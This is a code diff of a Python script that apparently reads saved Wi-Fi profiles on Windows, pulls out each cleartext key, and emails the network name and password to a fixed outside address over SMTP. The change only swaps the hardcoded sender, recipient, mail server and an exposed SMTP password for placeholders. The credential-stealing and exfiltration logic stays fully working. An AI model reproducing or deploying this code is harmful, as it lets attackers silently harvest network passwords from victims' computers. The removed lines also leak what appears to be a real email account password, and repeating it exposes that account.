@@ -13,13 +13,13 @@ for wifi in allWiFi:
     results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]
 
     try:
-        email = 'no-reply@for-fl.com.ua'
-        password = '+J7%n#chA2B5'
-        dest_email = 'admin@myprojects.info'
+        email = 'no-reply@mail.com'
+        password = '*****'
+        dest_email = 'admin@mail.com'
         subject = 'Wi-Fi'
         email_text = (f'Name: {wifi}, Password: {results[0]}')
         message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, dest_email, subject, email_text)
-        server = smtplib.SMTP_SSL('mail.adm.tools')
+        server = smtplib.SMTP_SSL('mail.hosting.tools')
         server.set_debuglevel(1)
         server.ehlo(email)
         server.login(email, password)
@@ -28,13 +28,13 @@ for wifi in allWiFi:
         server.quit()
         # print(f'Имя сети: {wifi}, Пароль: {results[0]}')
     except IndexError:
-        email = 'no-reply@for-fl.com.ua'
-        password = '+J7%n#chA2B5'
-        dest_email = 'admin@myprojects.info'
+        email = 'no-reply@mail.com'
+        password = '*****'
+        dest_email = 'admin@mail.com'
         subject = 'Wi-Fi'
         email_text = (f'Name: {wifi}, Password not found')
         message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, dest_email, subject, email_text)
-        server = smtplib.SMTP_SSL('mail.adm.tools')
+        server = smtplib.SMTP_SSL('mail.hosting.tools')
         server.set_debuglevel(1)
         server.ehlo(email)
         server.login(email, password)
